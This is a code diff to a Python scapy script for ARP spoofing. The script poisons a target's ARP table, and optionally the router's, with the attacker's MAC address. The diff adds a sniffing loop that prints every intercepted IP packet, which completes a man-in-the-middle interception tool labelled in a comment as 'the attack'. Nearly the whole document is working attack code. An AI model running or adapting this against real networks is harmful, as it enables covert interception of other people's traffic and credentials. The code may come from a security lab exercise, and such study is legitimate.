@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 import sys, getopt
-from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
+from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP
 from time import sleep
 import arpUtil
 import subprocess
@@ -14,7 +14,8 @@ options = {
         "target" : "127.0.0.1",
         "src": None , 
         "router" : None , 
-        "mac ":None 
+        "mac ":None , 
+        "ip" : None
     } 
 
 def main(argv :list )->None:
@@ -59,6 +60,7 @@ def main(argv :list )->None:
  
     options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
     options["mac"]=get_if_hwaddr(options["interface"])
+    options["ip"]= get_if_addr(options["interface"])
     #the attack 
     
     
@@ -67,7 +69,10 @@ def main(argv :list )->None:
     arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
     if(options["attackGW"]):
         arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
-
+    sniff(
+        lfilter= lambda x : IP in x and (x[IP].dst != options["ip"] or x[IP].src != options["ip"]) , prn = lambda x : x.show() 
+        
+    )
 if __name__ == "__main__":
     
     batcmd="sysctl net.ipv4.ip_forward"
